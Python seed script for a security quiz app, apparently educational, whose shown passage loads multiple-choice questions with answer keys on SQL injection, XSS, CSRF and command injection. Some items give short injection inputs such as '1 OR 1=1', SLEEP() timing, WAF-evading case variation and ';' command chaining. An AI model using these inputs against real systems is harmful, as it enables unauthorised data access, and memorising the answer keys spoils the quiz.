from app.db.database import SessionLocal, engine
from app import models
from sqlalchemy.orm import Session
from sqlalchemy.exc import OperationalError
from sqlalchemy import text
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def wait_for_db(max_retries=30, delay=2):
    logger.info("Waiting for database connection...")
    for i in range(max_retries):
        try:
            # Try to create a session and run a simple query
            db = SessionLocal()
            db.execute(text("SELECT 1"))

            db.close()
            logger.info("Database is ready!")
            return
        except OperationalError:
            logger.warning(f"Database not ready yet. Retrying in {delay} seconds... ({i+1}/{max_retries})")
            time.sleep(delay)
        except Exception as e:
            logger.error(f"Unexpected error while waiting for DB: {e}")
            time.sleep(delay)
    
    raise Exception("Could not connect to the database after multiple retries.")

def seed_data():
    wait_for_db()
    
    db: Session = SessionLocal()
    try:
        # Check if we have enough questions
        question_count = db.query(models.Question).count()
        if question_count >= 200:
            logger.info(f"Database already has {question_count} questions. Skipping seeding.")
            return

        logger.info(f"Database has {question_count} questions. Seeding to reach 200...")

        
        # List of all questions
        questions_data = [
            # 1. SQL Injection (20 Questions)
            {
                "text": "What does SQL stand for?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "SQL stands for Structured Query Language.",
                "options": [
                    {"text": "Structured Query Language", "is_correct": True},
                    {"text": "Simple Query Language", "is_correct": False},
                    {"text": "Standard Query Logic", "is_correct": False},
                    {"text": "System Query Loop", "is_correct": False}
                ]
            },
            {
                "text": "Which symbol is typically used to inject SQL commands?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "The single quote is often used to delimit strings in SQL, and can be used to break out of data context.",
                "options": [
                    {"text": "'", "is_correct": True},
                    {"text": "#", "is_correct": False},
                    {"text": "@", "is_correct": False},
                    {"text": "$", "is_correct": False}
                ]
            },
            {
                "text": "What is the primary impact of SQL Injection?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "SQLi allows attackers to access, modify, or delete data in the database.",
                "options": [
                    {"text": "Unauthorized database access", "is_correct": True},
                    {"text": "Slow internet connection", "is_correct": False},
                    {"text": "Browser crash", "is_correct": False},
                    {"text": "Server overheat", "is_correct": False}
                ]
            },
            {
                "text": "Which SQL statement is used to extract data from a database?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "SELECT is the standard command for querying data.",
                "options": [
                    {"text": "GET", "is_correct": False},
                    {"text": "SELECT", "is_correct": True},
                    {"text": "OPEN", "is_correct": False},
                    {"text": "EXTRACT", "is_correct": False}
                ]
            },
            {
                "text": "What does '1=1' represent in a SQL injection attack?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "It is a tautology, a condition that is always true.",
                "options": [
                    {"text": "A false condition", "is_correct": False},
                    {"text": "A syntax error", "is_correct": False},
                    {"text": "A tautology (always true)", "is_correct": True},
                    {"text": "A database error", "is_correct": False}
                ]
            },
            {
                "text": "Which comment syntax is valid in MySQL to comment out the rest of the query?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "'#' is a comment character in MySQL (along with '-- ').",
                "options": [
                    {"text": "//", "is_correct": False},
                    {"text": "#", "is_correct": True},
                    {"text": "<!--", "is_correct": False},
                    {"text": "%%", "is_correct": False}
                ]
            },
            {
                "text": "What type of SQL Injection relies on true/false responses?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Boolean-based Blind SQL Injection relies on inferring data from true/false responses.",
                "options": [
                    {"text": "Error-based", "is_correct": False},
                    {"text": "Union-based", "is_correct": False},
                    {"text": "Boolean-based Blind", "is_correct": True},
                    {"text": "Time-based Blind", "is_correct": False}
                ]
            },
            {
                "text": "What SQL function can cause a delay, useful for Time-Based Blind SQLi in MySQL?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "SLEEP() causes the database to pause for a specified number of seconds.",
                "options": [
                    {"text": "WAIT()", "is_correct": False},
                    {"text": "SLEEP()", "is_correct": True},
                    {"text": "DELAY()", "is_correct": False},
                    {"text": "PAUSE()", "is_correct": False}
                ]
            },
            {
                "text": "Which operator is used to combine results of two queries in Union-based SQLi?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "UNION combines result sets of two or more SELECT statements.",
                "options": [
                    {"text": "JOIN", "is_correct": False},
                    {"text": "UNION", "is_correct": True},
                    {"text": "AND", "is_correct": False},
                    {"text": "PLUS", "is_correct": False}
                ]
            },
            {
                "text": "To use UNION based SQL injection, what must match between the two queries?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "The number of columns and data types must correspond.",
                "options": [
                    {"text": "Table names", "is_correct": False},
                    {"text": "Number of columns", "is_correct": True},
                    {"text": "Row count", "is_correct": False},
                    {"text": "Database user", "is_correct": False}
                ]
            },
            {
                "text": "What is the best way to prevent SQL Injection in modern applications?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Parameterized queries (Prepared Statements) separate code from data.",
                "options": [
                    {"text": "Sanitizing input with regex", "is_correct": False},
                    {"text": "Parameterized Queries", "is_correct": True},
                    {"text": "Using a WAF", "is_correct": False},
                    {"text": "Trusting user input", "is_correct": False}
                ]
            },
            {
                "text": "In a SQLi context, what is 'Out-of-Band' injection?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Knowledge",
                "explanation": "It involves triggering an external network connection (like DNS or HTTP) to exfiltrate data.",
                "options": [
                    {"text": "Using a different band of wifi", "is_correct": False},
                    {"text": "Exfiltrating data via a different channel", "is_correct": True},
                    {"text": "Injecting into the band table", "is_correct": False},
                    {"text": "Injection that crashes the server", "is_correct": False}
                ]
            },
            {
                "text": "What system table often holds metadata about tables (like table names) in MySQL?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "information_schema.tables contains metadata about all tables.",
                "options": [
                    {"text": "mysql.tables", "is_correct": False},
                    {"text": "sys.objects", "is_correct": False},
                    {"text": "information_schema.tables", "is_correct": True},
                    {"text": "dbo.sysobjects", "is_correct": False}
                ]
            },
            {
                "text": "Which SQL injection tool is widely used for automated exploitation?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Tools",
                "explanation": "SQLMap is a popular open-source penetration testing tool.",
                "options": [
                    {"text": "Metasploit", "is_correct": False},
                    {"text": "SQLMap", "is_correct": True},
                    {"text": "Wireshark", "is_correct": False},
                    {"text": "Nmap", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Second Order' SQL Injection?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Malicious input is stored in the database and later executed when retrieved and used in a new query.",
                "options": [
                    {"text": "Injection that happens twice", "is_correct": False},
                    {"text": "Stored injection executed later", "is_correct": True},
                    {"text": "Injection into a secondary database", "is_correct": False},
                    {"text": "Using two quotes instead of one", "is_correct": False}
                ]
            },
            {
                "text": "If `SELECT * FROM items WHERE id = $id` is vulnerable, what input leaks all items?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Inputting `1 OR 1=1` results in `id = 1 OR 1=1`, which is true for all rows.",
                "options": [
                    {"text": "1", "is_correct": False},
                    {"text": "1 OR 1=1", "is_correct": True},
                    {"text": "0", "is_correct": False},
                    {"text": "NULL", "is_correct": False}
                ]
            },
            {
                "text": "What technique bypasses a WAF that blocks 'UNION SELECT'?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Evasion",
                "explanation": "SQL comments, case variation (UnIoN SeLeCt), or encoding can sometimes bypass filters.",
                "options": [
                    {"text": "Using 'UNION JOIN'", "is_correct": False},
                    {"text": "Case variation or encoding", "is_correct": True},
                    {"text": "Using HTTPS", "is_correct": False},
                    {"text": "Using a proxy", "is_correct": False}
                ]
            },
            {
                "text": "Which database is likely in use if `version()` returns the version?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Fingerprinting",
                "explanation": "MySQL and PostgreSQL use `version()`. MSSQL uses `@@version`.",
                "options": [
                    {"text": "Oracle", "is_correct": False},
                    {"text": "Microsoft SQL Server", "is_correct": False},
                    {"text": "MySQL / PostgreSQL", "is_correct": True},
                    {"text": "Access", "is_correct": False}
                ]
            },
            {
                "text": "What does a query with `LIMIT 0,1` typically return?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "It returns the first row of the result set.",
                "options": [
                    {"text": "No rows", "is_correct": False},
                    {"text": "The first row", "is_correct": True},
                    {"text": "The last row", "is_correct": False},
                    {"text": "All rows", "is_correct": False}
                ]
            },
            {
                "text": "How can you test if a parameter is vulnerable to SQLi without triggering errors?",
                "type": "multiple_choice",
                "topic": "SQL Scenario",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Using mathematical operations (e.g., id=2-1) to see if the same content loads as id=1.",
                "options": [
                    {"text": "Deleting the parameter", "is_correct": False},
                    {"text": "Using math (e.g., 2-1)", "is_correct": True},
                    {"text": "Injecting random strings", "is_correct": False},
                    {"text": "Changing method to POST", "is_correct": False}
                ]
            },
                
            # 2. XSS (20 Questions)
            {
                "text": "What is the full form of XSS?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "It stands for Cross-Site Scripting.",
                "options": [
                    {"text": "Cross-Site Styling", "is_correct": False},
                    {"text": "Cross-Site Scripting", "is_correct": True},
                    {"text": "Extreme Site Security", "is_correct": False},
                    {"text": "XML Style Sheet", "is_correct": False}
                ]
            },
            {
                "text": "Which part of the CIA triad does XSS primarily compromise?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "It compromises Integrity (modifying page) and often Confidentiality (stealing cookies).",
                "options": [
                    {"text": "Availability only", "is_correct": False},
                    {"text": "Integrity only", "is_correct": False},
                    {"text": "Integrity and Confidentiality", "is_correct": True},
                    {"text": "None", "is_correct": False}
                ]
            },
            {
                "text": "Where does Stored XSS execute?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "It executes in the browser of the victim who views the stored data.",
                "options": [
                    {"text": "On the web server", "is_correct": False},
                    {"text": "In the victim's browser", "is_correct": True},
                    {"text": "in the database", "is_correct": False},
                    {"text": "In the network firewall", "is_correct": False}
                ]
            },
            {
                "text": "What is the most common impact of XSS?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Session hijacking via stolen cookies is a very common high-impact outcome.",
                "options": [
                    {"text": "Server crash", "is_correct": False},
                    {"text": "Session Hijacking (Stealing Cookies)", "is_correct": True},
                    {"text": "Deleting the database", "is_correct": False},
                    {"text": "Remote Code Execution on server", "is_correct": False}
                ]
            },
            {
                "text": "Which context is Reflected XSS associated with?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "The payload is reflected from the request (URL or parameter) back to the response.",
                "options": [
                    {"text": "Stored database records", "is_correct": False},
                    {"text": "The requestURL/parameters", "is_correct": True},
                    {"text": "The server file system", "is_correct": False},
                    {"text": "Third-party APIs", "is_correct": False}
                ]
            },
            {
                "text": "Which HTML attribute is often vulnerable to XSS if not sanitized?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Event handlers like `onload`, `onclick`, `onerror`, `src`, `href` are common vectors.",
                "options": [
                    {"text": "class", "is_correct": False},
                    {"text": "id", "is_correct": False},
                    {"text": "onload / onclick", "is_correct": True},
                    {"text": "width", "is_correct": False}
                ]
            },
            {
                "text": "What is DOM-based XSS?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "The vulnerability lies in client-side scripts manipulating the DOM using unsafe data sources.",
                "options": [
                    {"text": "Server sends malicious HTML", "is_correct": False},
                    {"text": "Client-side script processes unsanitized input into DOM", "is_correct": True},
                    {"text": "Database injection", "is_correct": False},
                    {"text": "Network intercept", "is_correct": False}
                ]
            },
            {
                "text": "Which character encoding is often used to bypass XSS filters?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Evasion",
                "explanation": "URL encoding, HTML entity encoding, or Unicode escapes can sometimes bypass simple filters.",
                "options": [
                    {"text": "Base64", "is_correct": False},
                    {"text": "URL/HTML Entity Encoding", "is_correct": True},
                    {"text": "AES Encryption", "is_correct": False},
                    {"text": "Hashing", "is_correct": False}
                ]
            },
            {
                "text": "Which JS property is 'dangerous' sinks for DOM XSS?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "`innerHTML` parses string as HTML, executing scripts in some contexts (or `img onerror`). `outerHTML`, `document.write` are also dangerous.",
                "options": [
                    {"text": "innerText", "is_correct": False},
                    {"text": "textContent", "is_correct": False},
                    {"text": "innerHTML", "is_correct": True},
                    {"text": "value", "is_correct": False}
                ]
            },
            {
                "text": "What header helps prevent XSS exploits?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Content-Security-Policy (CSP) defines what sources are trusted.",
                "options": [
                    {"text": "X-Frame-Options", "is_correct": False},
                    {"text": "Content-Security-Policy (CSP)", "is_correct": True},
                    {"text": "Strict-Transport-Security", "is_correct": False},
                    {"text": "Cache-Control", "is_correct": False}
                ]
            },
            {
                "text": "What does the `HttpOnly` flag on a cookie do?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Mitigation",
                "explanation": "It prevents JavaScript (and thus XSS) from accessing the cookie.",
                "options": [
                    {"text": "Encrypts the cookie", "is_correct": False},
                    {"text": "Prevents client-side scripts from accessing the cookie", "is_correct": True},
                    {"text": "Makes the cookie visible only to HTTP (not HTTPS)", "is_correct": False},
                    {"text": "Expires the cookie immediately", "is_correct": False}
                ]
            },
            {
                "text": "Which of these is a Polyglot in XSS context?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "A polyglot payload is designed to be valid and executable in multiple contexts (e.g. inside attribute, inside script, inside HTML).",
                "options": [
                    {"text": "A payload that speaks multiple languages", "is_correct": False},
                    {"text": "A payload executable in multiple injection contexts", "is_correct": True},
                    {"text": "A specialized browser", "is_correct": False},
                    {"text": "A server configuration", "is_correct": False}
                ]
            },
            {
                "text": "If `javascript:` pseudo-protocol is used in an `href` attribute, what happens?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "The browser executes the code following `javascript:` when the link is clicked.",
                "options": [
                    {"text": "It links to a file named javascript", "is_correct": False},
                    {"text": "It executes the JavaScript code", "is_correct": True},
                    {"text": "It is ignored", "is_correct": False},
                    {"text": "It throws a syntax error", "is_correct": False}
                ]
            },
            {
                "text": "Which sink is safe to use to avoid XSS when setting text content?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "`textContent` or `innerText` treats content as plain text, not HTML.",
                "options": [
                    {"text": "innerHTML", "is_correct": False},
                    {"text": "document.write", "is_correct": False},
                    {"text": "textContent", "is_correct": True},
                    {"text": "outerHTML", "is_correct": False}
                ]
            },
            {
                "text": "What does 'Mutated XSS' (mXSS) rely on?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "It relies on differences in how browsers parse and mutate HTML (e.g. fixing broken tags) which can turn safe markup into unsafe markup.",
                "options": [
                    {"text": "Mutation Observers", "is_correct": False},
                    {"text": "Browser HTML parsing/fixups creating executable code", "is_correct": True},
                    {"text": "Server-side mutation", "is_correct": False},
                    {"text": "Genetic algorithms", "is_correct": False}
                ]
            },
            {
                "text": "Can XSS be used to perform CSRF attacks?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Hard",
                "skill_focus": "Chaining",
                "explanation": "Yes, XSS can execute arbitrary JS, which can send forged requests on behalf of the user, bypassing CSRF tokens if they can be read.",
                "options": [
                    {"text": "No, they are different", "is_correct": False},
                    {"text": "Yes, XSS can automate requests and steal tokens", "is_correct": True},
                    {"text": "Only if the user is admin", "is_correct": False},
                    {"text": "Only in Internet Explorer", "is_correct": False}
                ]
            },
            {
                "text": "What is the 'Self-XSS'?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "It requires the victim to manually inject the payload (e.g., pasting into console), usually via social engineering.",
                "options": [
                    {"text": "XSS that fixes itself", "is_correct": False},
                    {"text": "Attack where victim is tricked into executing code on themselves", "is_correct": True},
                    {"text": "XSS on your own server", "is_correct": False},
                    {"text": "An automated XSS scanner", "is_correct": False}
                ]
            },
            {
                "text": "Which framework feature often mitigates XSS by default?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "Modern frameworks like React, Angular, and Vue automatically escape content bound to views.",
                "options": [
                    {"text": "Automatic Context-Aware Encoding/Escaping", "is_correct": True},
                    {"text": "Faster rendering", "is_correct": False},
                    {"text": "Virtual DOM", "is_correct": False},
                    {"text": "Components", "is_correct": False}
                ]
            },
            {
                "text": "What is a 'Blind' XSS?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "The attacker inputs the payload but it triggers elsewhere (e.g., in an admin panel or logs) where the attacker can't see it.",
                "options": [
                    {"text": "XSS without a monitor", "is_correct": False},
                    {"text": "Payload fires in an application part not visible to attacker", "is_correct": True},
                    {"text": "XSS using audio", "is_correct": False},
                    {"text": "It is impossible", "is_correct": False}
                ]
            },
            {
                "text": "Which tool is commonly used to exploit XSS by hooking browsers?",
                "type": "multiple_choice",
                "topic": "XSS Scenario",
                "difficulty": "Hard",
                "skill_focus": "Tools",
                "explanation": "BeEF (Browser Exploitation Framework) is designed to hook browsers vulnerable to XSS.",
                "options": [
                    {"text": "Metasploit", "is_correct": False},
                    {"text": "BeEF", "is_correct": True},
                    {"text": "Wireshark", "is_correct": False},
                    {"text": "Hydra", "is_correct": False}
                ]
            },

            # 3. CSRF (20 Questions)
            {
                "text": "What does CSRF stand for?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Cross-Site Request Forgery.",
                "options": [
                    {"text": "Cross-Site Request Forgery", "is_correct": True},
                    {"text": "Client-Side Request Form", "is_correct": False},
                    {"text": "Common Server Runtime Failure", "is_correct": False},
                    {"text": "Cross-System Remote File", "is_correct": False}
                ]
            },
            {
                "text": "How does a CSRF attack work?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "It tricks an authenticated user into executing an unwanted action on a web application they are logged into.",
                "options": [
                    {"text": "Steals user password directly", "is_correct": False},
                    {"text": "Tricks user's browser into sending a request to a vulnerable site", "is_correct": True},
                    {"text": "Injects scripts into the site", "is_correct": False},
                    {"text": "Crashes the server", "is_correct": False}
                ]
            },
            {
                "text": "What is the primary mechanism that allows CSRF?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Browsers automatically include ambient credentials (cookies, basic auth) with cross-origin requests.",
                "options": [
                    {"text": "Browser bugs", "is_correct": False},
                    {"text": "Automatic inclusion of session cookies/credentials", "is_correct": True},
                    {"text": "Weak passwords", "is_correct": False},
                    {"text": "Open ports", "is_correct": False}
                ]
            },
            {
                "text": "What is the most common defense against CSRF?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Anti-CSRF tokens (synchronizer tokens) ensure the request originated from the legitimate site.",
                "options": [
                    {"text": "Encryption", "is_correct": False},
                    {"text": "Anti-CSRF Tokens", "is_correct": True},
                    {"text": "Firewalls", "is_correct": False},
                    {"text": "Hiding the form", "is_correct": False}
                ]
            },
            {
                "text": "Can `SameSite` cookie attribute prevent CSRF?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Yes, `SameSite=Strict` or `Lax` prevents cookies from being sent in cross-site requests.",
                "options": [
                    {"text": "No, it is for XSS", "is_correct": False},
                    {"text": "Yes, it restricts cookie sending on cross-origin requests", "is_correct": True},
                    {"text": "Only in Firefox", "is_correct": False},
                    {"text": "No, it is deprecated", "is_correct": False}
                ]
            },
            {
                "text": "Which HTTP method is generally logically safe from CSRF via `<img>` tags?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "`<img>` tags issue GET requests. If state-changing actions require POST, simple image tags fail.",
                "options": [
                    {"text": "GET", "is_correct": False},
                    {"text": "POST", "is_correct": True},
                    {"text": "HEAD", "is_correct": False},
                    {"text": "OPTIONS", "is_correct": False}
                ]
            },
            {
                "text": "Why is 'Double Submit Cookie' a CSRF defense?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Hard",
                "skill_focus": "Prevention",
                "explanation": "It sends a random value in both a cookie and a request parameter; the server verifies they match.",
                "options": [
                    {"text": "It submits the form twice", "is_correct": False},
                    {"text": "Verifies token in cookie matches token in request body", "is_correct": True},
                    {"text": "Uses two cookies", "is_correct": False},
                    {"text": "It is not a defense", "is_correct": False}
                ]
            },
            {
                "text": "What happens if a site allows changing email via GET request without token?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "An attacker can simply send a link (or modify via image src) to change the victim's email.",
                "options": [
                    {"text": "It is secure", "is_correct": False},
                    {"text": "It is vulnerable to CSRF", "is_correct": True},
                    {"text": "It throws an error", "is_correct": False},
                    {"text": "It requires admin approval", "is_correct": False}
                ]
            },
            {
                "text": "Does an XSS vulnerability defeat CSRF protection?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Hard",
                "skill_focus": "Chaining",
                "explanation": "Yes, XSS allows reading the CSRF token and constructing a valid forged request.",
                "options": [
                    {"text": "No", "is_correct": False},
                    {"text": "Yes, attacker can read the token via script", "is_correct": True},
                    {"text": "Only if token is in header", "is_correct": False},
                    {"text": "Only for GET requests", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Login CSRF'?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Attacker logs the victim into the attacker's account, so victim's activity is tracked by attacker.",
                "options": [
                    {"text": "Logging in as admin", "is_correct": False},
                    {"text": "Forcing victim to log in to attacker's account", "is_correct": True},
                    {"text": "Bypassing login", "is_correct": False},
                    {"text": "Stealing login credentials", "is_correct": False}
                ]
            },
            {
                "text": "Is JSON-based API automatically safe from CSRF?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Mostly yes, because HTML forms can't send JSON by default, but with CORS misconfig or flash, it might be possible.",
                "options": [
                    {"text": "Yes, always", "is_correct": False},
                    {"text": "No, if CORS is misconfigured or via other vectors", "is_correct": True},
                    {"text": "No, because forms send JSON", "is_correct": False},
                    {"text": "Yes, because browser blocks JSON", "is_correct": False}
                ]
            },
            {
                "text": "Which header is used to check the origin of the request?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Origin and Referer headers help identify where the request originated.",
                "options": [
                    {"text": "Host", "is_correct": False},
                    {"text": "Origin / Referer", "is_correct": True},
                    {"text": "User-Agent", "is_correct": False},
                    {"text": "Accept", "is_correct": False}
                ]
            },
            {
                "text": "What does a CSRF PoC often look like?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "Often an HTML page with a hidden form that auto-submits via JavaScript.",
                "options": [
                    {"text": "A python script", "is_correct": False},
                    {"text": "An auto-submitting HTML form", "is_correct": True},
                    {"text": "A SQL query", "is_correct": False},
                    {"text": "A binary file", "is_correct": False}
                ]
            },
            {
                "text": "If a request requires a custom header (e.g. X-Requested-With), is it CSRF vulnerable?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Hard",
                "skill_focus": "Prevention",
                "explanation": "Standard HTML forms can't add custom headers. An attacker needs CORS to send custom headers cross-origin.",
                "options": [
                    {"text": "Yes, easily", "is_correct": False},
                    {"text": "Generally no, unless CORS allows it", "is_correct": True},
                    {"text": "Yes, using <img>", "is_correct": False},
                    {"text": "It depends on the cookie", "is_correct": False}
                ]
            },
            {
                "text": "What is the specialized token pattern name for CSRF defense?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Synchronizer Token Pattern.",
                "options": [
                    {"text": "Asynchronous Token Pattern", "is_correct": False},
                    {"text": "Synchronizer Token Pattern", "is_correct": True},
                    {"text": "Random Cookie Pattern", "is_correct": False},
                    {"text": "Session ID Pattern", "is_correct": False}
                ]
            },
            {
                "text": "Why don't we just use the session ID as the CSRF token?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "It would expose the session ID in the HTML source/URL, increasing risk of session hijacking.",
                "options": [
                    {"text": "It is too short", "is_correct": False},
                    {"text": "It increases risk of session leakage/hijacking", "is_correct": True},
                    {"text": "It doesn't work", "is_correct": False},
                    {"text": "It's fine to use it", "is_correct": False}
                ]
            },
            {
                "text": "Can a CSRF attack retrieve data from the response?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Limit",
                "explanation": "Standard CSRF is a 'one-way' attack; the attacker sends a request but cannot see the response (unless CORS/XSS allows).",
                "options": [
                    {"text": "Yes, always", "is_correct": False},
                    {"text": "No, it's a state-changing attack, not data retrieval", "is_correct": True},
                    {"text": "Only if it is JSON", "is_correct": False},
                    {"text": "Only if status is 200", "is_correct": False}
                ]
            },
            {
                "text": "What is the risk of using GET for state-changing actions?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "It makes CSRF trivial (via image tags, links) and violates HTTP semantics.",
                "options": [
                    {"text": "It is slower", "is_correct": False},
                    {"text": "Trivial CSRF exploitation", "is_correct": True},
                    {"text": "Data corruption", "is_correct": False},
                    {"text": "None", "is_correct": False}
                ]
            },
            {
                "text": "Which attribute in `set-cookie` is crucial for CSRF defense in modern browsers?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "SameSite attribute.",
                "options": [
                    {"text": "Secure", "is_correct": False},
                    {"text": "SameSite", "is_correct": True},
                    {"text": "Domain", "is_correct": False},
                    {"text": "Path", "is_correct": False}
                ]
            },
            {
                "text": "If a site checks `Referer` header only, can it be bypassed?",
                "type": "multiple_choice",
                "topic": "CSRF Scenario",
                "difficulty": "Hard",
                "skill_focus": "Evasion",
                "explanation": "Yes, referer can be spoofed in some conditions, or omitted (e.g., from HTTPS to HTTP, or via meta tag).",
                "options": [
                    {"text": "No, Referer is immutable", "is_correct": False},
                    {"text": "Yes, referer can be suppressed or sometimes spoofed", "is_correct": True},
                    {"text": "Only in Chrome", "is_correct": False},
                    {"text": "Only if user uses VPN", "is_correct": False}
                ]
            },

            # 4. Command Injection (20 Questions)
            {
                "text": "What is Command Injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Execution of arbitrary commands on the host operating system via a vulnerable application.",
                "options": [
                    {"text": "Injecting SQL commands", "is_correct": False},
                    {"text": "Executing OS commands via application input", "is_correct": True},
                    {"text": "Injecting HTML commands", "is_correct": False},
                    {"text": "Overwriting memory", "is_correct": False}
                ]
            },
            {
                "text": "Which character is often used to chain commands in Linux?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "The semi-colon `;` allows sequential execution of commands.",
                "options": [
                    {"text": ".", "is_correct": False},
                    {"text": ";", "is_correct": True},
                    {"text": ":", "is_correct": False},
                    {"text": ",", "is_correct": False}
                ]
            },
            {
